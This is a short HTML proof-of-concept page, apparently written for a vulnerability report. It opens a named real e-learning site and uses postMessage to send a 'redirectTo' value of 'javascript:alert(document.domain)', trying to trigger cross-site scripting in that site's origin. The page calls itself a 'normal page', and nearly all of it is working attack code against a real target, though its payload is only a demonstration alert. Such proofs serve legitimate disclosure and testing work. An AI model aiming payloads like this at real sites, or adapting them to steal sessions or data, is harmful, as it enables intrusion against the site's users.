<!DOCTYPE html>
<html>
  <head>
    
    <meta charset="UTF-8" />
    <title>Postmessage PoC</title>
  
  </head>
  <body>

<h1> Hi this is a normal page !</h1>
    <script>
      let win = window.open("https://iclass.eccouncil.org/");
      let msg = { redirectTo: "javascript:alert(document.domain)" };

      setTimeout(function () {
        win.postMessage(msg, "*");
      }, 5000);
    </script>
  </body>
</html>
